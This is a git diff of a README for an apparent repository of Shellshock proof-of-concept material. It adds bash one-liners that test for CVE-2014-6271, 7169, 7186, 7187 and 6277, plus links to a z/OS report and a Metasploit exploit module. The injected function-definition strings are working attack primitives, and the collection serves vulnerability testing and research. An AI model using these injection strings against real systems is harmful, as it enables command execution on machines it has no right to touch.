@@ -1,4 +1,4 @@
-Shellshocker - Repository of CVE 2014-6271 Proof of Concept Code
+Shellshocker - Repository of "Shellshock" Proof of Concept Code
 =================
 
 Collection of Proof of Concepts and Potential Targets for #ShellShocker
@@ -22,13 +22,26 @@ Please submit a pull request if you have more links or other resources
 
 **If you know of PoCs for any of these, please submit an issue or pull request with a link.**
 
-## Command Line (*nix Bash and Windows via Cygwin)
-+ `env x='() { :;}; echo vulnerable' bash -c 'echo hello'`
-+ IBM z/OS - http://mainframed767.tumblr.com/post/98446455927/bad-news-is-it-totally-works-in-bash-on-z-os-and
+## Command Line (Linux, OSX, and Windows via Cygwin)
 
-## Post CVE-2014-6271 Command Line
-_Fixed by CVE-2014-7169_
-+ Via @Taviso - `env var='() {(a)=>\' bash -c "echo date"; cat echo`
+### CVE-2014-6271
++`env X='() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c id`
+
+### CVE-2014-7169
+_will create a file named echo in cwd with date in it, if vulnerable_
++ `env X='() { (a)=>\' bash -c "echo date"; cat echo`
+
+### CVE-2014-7186
++ `bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo "CVE-2014-7186 vulnerable, redir_stack"`
+
+### CVE-2014-7187
++ `(for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash || echo "CVE-2014-7187 vulnerable, word_lineno"`
+
+### CVE-2014-6277
++ `foo='() { echo "CVE-2014-6277 vulnerable"; }' bash -c foo`
+
+## IBM z/OS - 
++ http://mainframed767.tumblr.com/post/98446455927/bad-news-is-it-totally-works-in-bash-on-z-os-and
 
 ## HTTP
 + Metasploit Exploit Module Apache MOD_CGI - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/apache_mod_cgi_bash_env_exec.rb
